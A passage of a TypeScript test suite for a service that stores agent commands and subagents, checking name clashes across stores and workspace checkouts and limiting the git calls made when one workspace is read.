    await expect(service.listLibrary(global, 'command')).resolves.toMatchObject([{ name: 'ship' }])
    await expect(service.listLibrary(ofProject(), 'command')).resolves.toMatchObject([
      { name: 'deploy' }
    ])
  })

  /*
   * A session is handed both stores at once, so a `ship` in each is one command
   * as far as the agent is concerned and which of them answers is not ours to
   * say. The check is across stores for exactly that reason.
   */
  it('refuses a name the store beside it already uses', async () => {
    await service.createLibraryEntry(global, 'command', 'ship', 'x')

    await expect(
      service.createLibraryEntry(ofProject(), 'command', 'ship', 'y')
    ).rejects.toMatchObject({ name: 'LibraryError', code: 'libraryExists' })
  })

  // The two kinds are two namespaces: a `review` command and a `review`
  // subagent are different things and never meet.
  it('lets the two kinds share a name', async () => {
    await service.createLibraryEntry(global, 'command', 'reviewer', 'x')

    await expect(
      service.createLibraryEntry(global, 'subagent', 'reviewer', SUBAGENT)
    ).resolves.toMatchObject({ name: 'reviewer' })
  })

  it('opens one for editing and saves over it', async () => {
    await service.createLibraryEntry(global, 'command', 'ship', 'Commit.')

    await expect(service.readLibraryEntry(global, 'command', 'ship')).resolves.toMatchObject({
      name: 'ship',
      body: 'Commit.'
    })

    await service.saveLibraryEntry(global, 'command', 'ship', 'Commit and push.')

    await expect(service.readLibraryEntry(global, 'command', 'ship')).resolves.toMatchObject({
      raw: 'Commit and push.'
    })
  })

  it('renames one, and refuses a name in use beside it', async () => {
    await service.createLibraryEntry(global, 'command', 'ship', 'x')
    await service.createLibraryEntry(ofProject(), 'command', 'deploy', 'y')

    await expect(
      service.renameLibraryEntry(global, 'command', 'ship', 'deploy')
    ).rejects.toMatchObject({ code: 'libraryExists' })

    await expect(
      service.renameLibraryEntry(global, 'command', 'ship', 'gate')
    ).resolves.toMatchObject({ name: 'gate' })
    await expect(service.listLibrary(global, 'command')).resolves.toMatchObject([{ name: 'gate' }])
  })

  it('removes one', async () => {
    await service.createLibraryEntry(global, 'command', 'ship', 'x')

    await service.removeLibraryEntry(global, 'command', 'ship')

    await expect(service.listLibrary(global, 'command')).resolves.toEqual([])
  })

  /*
   * A checkout carries its own, and they share a session with the stores. So a
   * name taken there is taken here, which is the reach `libraryNamesBeside`
   * exists to cover — and the reason it reads the worktrees rather than only
   * the two stores.
   */
  it("refuses a name a workspace's own checkout already uses", async () => {
    const workspace = await service.createWorkspaceIn(projectId)
    await mkdir(join(workspace.path, '.claude', 'commands'), { recursive: true })
    await writeFile(join(workspace.path, '.claude', 'commands', 'ship.md'), 'x', 'utf8')

    await expect(service.createLibraryEntry(global, 'command', 'ship', 'y')).rejects.toMatchObject({
      code: 'libraryExists'
    })
  })

  // A project's store meets only its own checkouts; the installation's meets
  // every one of them, which is the whole difference between the two arms.
  it("does not mind a name taken in another project's checkout", async () => {
    const other = await initRepo(join(dir, 'ledger')).then(() =>
      service.addProjectFromPath(join(dir, 'ledger'))
    )
    const workspace = await service.createWorkspaceIn(other.id)
    await mkdir(join(workspace.path, '.claude', 'commands'), { recursive: true })
    await writeFile(join(workspace.path, '.claude', 'commands', 'ship.md'), 'x', 'utf8')

    await expect(
      service.createLibraryEntry(ofProject(), 'command', 'ship', 'y')
    ).resolves.toMatchObject({ name: 'ship' })
  })

  it('reads what an import would write without writing it', async () => {
    const preview = await service.inspectLibrary('subagent', { kind: 'text', text: SUBAGENT })

    expect(preview).toEqual({
      name: 'reviewer',
      description: 'When reviewing.',
      text: SUBAGENT
    })
    await expect(service.listLibrary(global, 'subagent')).resolves.toEqual([])
  })
})

/*
 * What a finished turn reads. Counting every sibling ran two git processes per
 * workspace of the project after every turn of every agent, for rows nothing
 * had touched.
 */
describe('reading one workspace', () => {
  interface Call {
    readonly cwd: string
    readonly args: readonly string[]
  }

  async function recorded(): Promise<{
    service: OctopusService
    projectId: string
    calls: Call[]
  }> {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const calls: Call[] = []
    const watched = await createService({
      ...paths(dir),
      makeExec: (cwd, options) => {
        const exec = gitIn(cwd, options)
        return (args) => {
          calls.push({ cwd, args })
          return exec(args)
        }
      }
    })
    const project = await watched.addProjectFromPath(repo)
    return { service: watched, projectId: project.id, calls }
  }

  it('asks git about that workspace and no other', async () => {
    const { service: watched, projectId, calls } = await recorded()
    const asked = await watched.createWorkspaceIn(projectId)
    const sibling = await watched.createWorkspaceIn(projectId)
    await writeFile(join(asked.path, 'draft.txt'), 'work\n', 'utf8')
    calls.length = 0

    const read = await watched.readWorkspace(asked.id)

    expect(calls.some((call) => call.cwd === asked.path)).toBe(true)
    expect(calls.some((call) => call.cwd === sibling.path)).toBe(false)
    const listed = await watched.listWorkspaces(projectId)
    expect(read).toEqual(listed.find((row) => row.id === asked.id))
    expect(read).toMatchObject({ changedFiles: 1, missing: false })
  })

  // A repository moved away answers nothing; the row must not claim its
  // directory is gone, which the window would act on by closing its terminal.
  it('says nothing is missing when the repository cannot be read', async () => {
    const { service: watched, projectId } = await recorded()
    const workspace = await watched.createWorkspaceIn(projectId)
    await rename(join(dir, 'planner'), join(dir, 'moved'))

    await expect(watched.readWorkspace(workspace.id)).resolves.toMatchObject({
      id: workspace.id,
      missing: false
    })
  })

  it('answers nothing for a workspace that is gone', async () => {
    await expect(service.readWorkspace('planner/nobody')).resolves.toBeNull()
  })

  /*
   * A turn ending fires the row, the diff and the file sides together, and each
   * resolved the base on its own. Shared while in flight, and only then, so a
   * later question is always answered afresh.
   */
  it('resolves the base once for reads that overlap, and afresh after', async () => {
    const { service: watched, projectId, calls } = await recorded()
    const first = await watched.createWorkspaceIn(projectId)
    const second = await watched.createWorkspaceIn(projectId)
    const remotes = (): number => calls.filter((call) => call.args[0] === 'remote').length
    calls.length = 0

    await Promise.all([watched.readWorkspace(first.id), watched.readWorkspace(second.id)])
    expect(remotes()).toBe(1)

    await watched.readWorkspace(first.id)
    expect(remotes()).toBe(2)
  })

  /** The repository stating both fields, and trusted, so each costs git a question. */
  async function stating(watched: OctopusService, projectId: string): Promise<void> {
    const repo = join(dir, 'planner')
    await writeFile(join(repo, '.gitignore'), '.env.local\n', 'utf8')
    await mkdir(join(repo, '.octopus'), { recursive: true })
    await writeFile(
      join(repo, '.octopus', 'project.json'),
      '{"baseBranch":"develop","envFile":".env.local"}',
      'utf8'
    )
    await run('git', ['add', '-A'], { cwd: repo })
    await run('git', ['commit', '-q', '-m', 'octopus'], { cwd: repo })
    await run('git', ['branch', 'develop'], { cwd: repo })
    await watched.updateProjectById(projectId, { trustRepository: true })
  }

  /*
   * A reader of one live field pays for that field's check alone: the base
   * costs a branch lookup, the env file a `check-ignore`, and every base
   * resolution used to run both — a `check-ignore` twice a turn for nothing.
   */
  it('resolves the base without asking whether the env file is ignored', async () => {
    const { service: watched, projectId, calls } = await recorded()
    await stating(watched, projectId)
    const workspace = await watched.createWorkspaceIn(projectId)
    calls.length = 0

    await watched.readWorkspace(workspace.id)

    const asked = calls.map((call) => call.args)
    expect(asked).toContainEqual(['rev-parse', '--verify', 'refs/heads/develop'])
    expect(asked.map(([first]) => first)).not.toContain('check-ignore')
  })

  it('reads the env file without looking for the base branch', async () => {
    const { service: watched, projectId, calls } = await recorded()
    await stating(watched, projectId)
    const workspace = await watched.createWorkspaceIn(projectId)
    calls.length = 0

    await watched.readWorkspaceEnv(workspace.id)

    const asked = calls.map((call) => call.args)
    expect(asked).toContainEqual(['check-ignore', '-q', '--', '.env.local'])
    expect(asked).not.toContainEqual(['rev-parse', '--verify', 'refs/heads/develop'])
  })
})
